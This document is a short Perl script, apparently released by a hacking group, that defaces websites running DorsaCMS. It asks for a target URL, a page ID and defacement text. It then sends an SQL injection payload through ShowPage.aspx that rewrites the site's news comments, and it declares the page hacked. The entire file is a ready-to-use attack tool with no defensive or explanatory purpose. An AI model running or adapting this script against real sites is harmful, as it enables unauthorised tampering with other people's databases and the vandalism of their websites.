#!/usr/bin/perl
#d3c0der
system('color a');
system('cls');
system('title DorsaCMS Defacer');
print q{
===================================================
-= ** =-
DorsaCMS Defacer

[+] Coded by d3c0der   =>  d3c0der@hotmail.com

[+] AttackerZ Under Ground Group  =>  wwW.Attackerz.iR
-= ** =-
===================================================


};

use HTTP::Request;
use LWP::UserAgent;

 

print "~# Target : ";
$site=<STDIN>;
chomp $site;
print "~# PageID : ";
$id=<STDIN>;
chomp $id;
 print "~# Deface Text : ";
$def=<STDIN>;
chomp $def;

if ( $site !~ /^http:/ ) {
$site = 'http://' . $site;
}
if ( $site !~ /\/$/ ) {
$site = $site . '/';
}
print "\n";

print "->hacking : $site\n";
 

 

@path1=("ShowPage.aspx?page_=news&PageID=$id update news set Comment='$def';--");

foreach $ways(@path1){

$final=$site.$ways;

my $req=HTTP::Request->new(GET=>$final);
my $ua=LWP::UserAgent->new();
$ua->timeout(30);
my $response=$ua->request($req);

 
}
 
print "[-] now this url is hacked $site./ShowPage.aspx?page_=news&PageID=.$id\n";